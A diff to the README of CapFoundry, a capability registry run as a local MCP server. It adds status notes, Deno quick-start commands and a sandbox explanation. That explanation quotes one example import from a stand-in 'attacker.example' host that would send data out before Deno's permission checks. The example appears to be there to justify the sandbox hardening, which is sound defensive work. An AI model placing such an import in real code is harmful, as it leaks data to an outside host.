@@ -16,18 +16,53 @@ The architectural shorthand is:
 
 ## Current status
 
-CapFoundry is currently in the **architecture and MVP-design stage**. The repository is intentionally small while the central assumptions are being tested.
+CapFoundry is in **early implementation**. Phase 0 and Phase 1 of the [implementation PRD](PRD.md)
+are done: CFCM runs as a local MCP server that searches a compact index, resolves and verifies an
+artifact, executes it in a zero-permission Deno subprocess, and writes local telemetry — proven end
+to end on one capability, `CapFoundry.geo.distance`.
 
-The first implementation is planned around:
+The remaining six public capabilities, the private and `Local.*` fixtures, candidate submission,
+the Capability Awareness Skill, the A/B evaluation harness and Explore are still ahead.
 
-- a compact local **CFCM**
-- namespaced capabilities such as `CapFoundry.geo.distance`
-- private organization namespaces such as `Netsi.*`
-- the reserved machine-local namespace `Local.*`
-- local-first capability execution
-- capability artifact caching and optional artifact return
-- candidate submission when an agent creates something worth retaining
-- a small, measurable initial capability set
+## Quick start
+
+Requires [Deno](https://deno.com) 2.x.
+
+```bash
+# Verify every capability package, then build the registry index
+deno task validate
+deno task build-index
+
+# Run the full suite: search, sandbox escapes, cache integrity, telemetry redaction
+deno task test
+```
+
+Point CFCM at this repository as its registry and register it with a coding agent:
+
+```bash
+cp cfcm.example.json cfcm.json          # set "registry" to "." to use this checkout
+deno task cfcm:mcp                      # speaks MCP over stdio
+```
+
+In Claude Code, register the server once:
+
+```bash
+claude mcp add cfcm -- deno run --allow-read --allow-write --allow-net --allow-run --allow-env \
+  /absolute/path/to/CapFoundry/cfcm/mcp/server.ts
+```
+
+The agent then gets three tools — `cfcm_search`, `cfcm_invoke` and `cfcm_describe`. A confident
+search that is given input runs the capability in the same call, so the common case costs one
+round trip.
+
+### A note on the sandbox
+
+Capability artifacts execute in their own Deno subprocess with **no `--allow-*` flag at all**, plus
+`--no-remote`, `--no-npm` and a cleared environment. Zero permissions on its own is not enough:
+Deno does not gate remote module loading behind `--allow-net`, so a static
+`import "https://attacker.example/?data=..."` inside an artifact would be fetched before any
+permission check ran. See SEC-10 in the [PRD](PRD.md) and the escape tests in
+`tests/sandbox_test.ts`.
 
 ## Documentation
 
